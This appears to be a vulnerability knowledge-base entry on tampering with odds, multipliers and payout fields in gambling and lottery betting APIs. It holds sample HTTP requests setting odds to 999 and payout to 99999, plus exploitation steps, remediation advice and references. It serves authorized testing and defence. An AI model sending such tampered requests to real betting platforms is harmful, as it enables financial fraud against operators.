---
title: Tampering with betting/settlement odds and multipliers (financial impact)
cve: None (business logic)
severity: critical
cvss: 9.0
product: Gambling/lottery betting endpoints
versions: Any
ports: 80, 443
keywords: bet, odds, odds, multipliers, settlement, tampering
entry: Modify odds/multiple in the betting body
verified: false
sources: Compiled from public sources (business logic; no CVE)
---

## Fingerprints

```
/api/bet/create    {"odds":1.98,"amount":100,"issue":"2024110"}
/api/bet/settle    /api/lottery/bet   /api/game/bet
```

Odds/multipliers should be calculated server-side according to the game rules; `odds`, `multiple`, `rate`, or `payout` in the request body are potential tampering points.

## Prerequisites

- An authorized test account (with a small balance); ability to capture betting requests.

## PoC

```http
### 1) Tamper with odds
POST /api/bet/create HTTP/1.1
Content-Type: application/json

{"issue":"2024110","amount":10,"odds":999,"selection":"home"}

### 2) Tamper with the multiplier/settlement amount
POST /api/bet/settle HTTP/1.1

{"betId":123,"payout":99999}
```

## Exploitation Steps

1. Place a normal minimum-value bet and record the server-returned `odds` and `payout` (baseline).
2. Increase `odds` and place another bet: if the response's `payout` is calculated using the requested odds ⇒ confirmed.
3. Try changing `payout`/`amount`/`status` on the settlement endpoint; use only your own bets.
4. Try negative/0 values (`amount:-10`) and an oversized multiplier (`multiple:100`) to check server validation.
5. Confirmation requires both the **bet response + post-settlement balance** to change according to the tampered values; retain the bet number as evidence.

## Remediation and Mitigation

- Calculate all odds/multipliers/settlements server-side by game rules and draw number; accept only `issue`+`selection`+`amount` in the request body.
- Validate upper and lower bounds for amounts and odds; make settlement idempotent (a single state machine per bet).
- Reconcile bet odds against system odds after each draw.

## References

- OWASP WSTG-BUSL-01；CWE-472。
